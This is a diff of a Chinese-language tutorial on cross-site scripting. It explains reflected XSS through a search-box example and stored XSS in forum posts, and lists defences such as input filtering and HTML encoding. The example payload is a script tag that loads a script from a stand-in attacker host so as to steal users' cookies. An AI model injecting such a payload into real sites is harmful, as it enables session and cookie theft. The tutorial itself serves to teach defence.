@@ -51,10 +51,10 @@ all&ssid=s5-e&search_type=item&atype=&filterFineness=&rr=
 ``` <script src="http://hacker.qq.com/hacker.js"></script>``` <br/>
 实际的作用是模拟用户在搜索框中输入<br/>
 ``` <script src="http://hacker.qq.com/hacker.js"></script> ```<br/>
-后点击搜索。search.php未经处理的将其直接输入到页面， 黑客就可以获取用户在xsstest.qq.com网站的cookie。
+后点击搜索。search.php未经处理的将其直接输入到页面， 黑客就可以获取用户在xsstest.qq.com网站的cookie。<br/>
 **如何防范** <br/>
 - 后台对敏感字符过滤
-- 前端encodehtml <br/>
+- 前端encodehtml
 ### 持久型
 他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。<br/>
 如上例中的hack.js, 如果用户输入的内容是hack.js中的内容，而网站没有对用户输入的内容进行审查就存入数据库，然后在论坛帖子中展示，其他用户在浏览论坛的时候就会在浏览器中执行hack.js的js脚本。<br/>
